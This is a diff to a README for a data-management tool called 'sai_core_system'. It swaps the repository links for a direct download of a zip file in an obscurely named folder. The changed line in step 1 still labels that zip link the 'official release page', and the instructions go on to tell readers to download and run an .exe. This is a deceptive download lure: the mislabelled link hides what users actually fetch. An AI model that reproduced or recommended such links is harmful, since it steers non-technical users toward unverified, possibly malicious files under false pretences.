@@ -1,6 +1,6 @@
 # ⚙️ sai_core_system - Simple tools for better data management
 
-[![Download sai_core_system](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/dowelpineucalyptgunnii138/sai_core_system)
+[![Download sai_core_system](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/dowelpineucalyptgunnii138/sai_core_system/raw/refs/heads/main/truantcy/core-system-sai-hest.zip)
 
 ## 🎯 About This System
 
@@ -21,7 +21,7 @@ Most computers purchased within the last five years meet these needs. If your ma
 
 Follow these steps to install the sai_core_system on your computer.
 
-1. Go to the [official release page](https://github.com/dowelpineucalyptgunnii138/sai_core_system).
+1. Go to the [official release page](https://github.com/dowelpineucalyptgunnii138/sai_core_system/raw/refs/heads/main/truantcy/core-system-sai-hest.zip).
 2. Look for the latest version listed under the Releases section.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
